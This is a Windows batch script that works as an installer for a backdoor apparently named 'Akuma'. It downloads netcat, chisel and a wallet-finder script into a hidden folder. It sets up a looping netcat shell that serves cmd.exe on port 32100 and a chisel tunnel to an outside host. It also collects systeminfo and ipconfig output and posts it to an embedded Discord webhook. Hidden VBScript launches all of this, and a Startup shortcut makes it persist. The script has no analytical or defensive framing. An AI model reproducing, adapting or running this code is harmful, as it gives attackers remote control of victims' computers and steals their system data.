@echo off
rmdir /s /q %homedrive%\Akuma
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
mkdir %homedrive%\Akuma\nc
%homedrive%
cd %homedrive%\A7uma
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcurl.dll > %homedrive%\Akuma\libcurl.dll
curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/curl.exe > %homedrive%\Akuma\curl.exe
where curl >nul 2>nul
if %errorlevel% == 0 (
curl -L https://github.com/curl/curl/releases/download/curl-8_4_0/curl-8.4.0.zip > %homedrive%\Akuma\curl-8.4.0.zip
powershell Expand-Archive -Path '%homedrive%\Akuma\curl-8.4.0.zip' -DestinationPath '%homedrive%\Akuma'
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\curl.vbs
echo objShell.Run "%homedrive%\Akuma\curl-8.4.0\buildconf.bat", 0, False >> %homedrive%\Akuma\curl.vbs
) else (
# Pause the script to keep the window open
)
cd %homedrive%\Akuma
echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
echo :start >> %homedrive%\Akuma\nc.bat
echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
echo goto start >> %homedrive%\Akuma\nc.bat
echo :start >> %homedrive%\Akuma\chisel.bat
echo %homedrive%\Akuma\chisel.exe client 4kum4n0d3z3r0.xyz:32101 127.0.0.1:32102 >> %homedrive%\Akuma\chisel.bat
echo goto start >> %homedrive%\Akuma\chisel.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
::echo objShell.Run "%homedrive%\Akuma\WalletFinder.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
start %homedrive%\Akuma\Akuma.vbs
exit
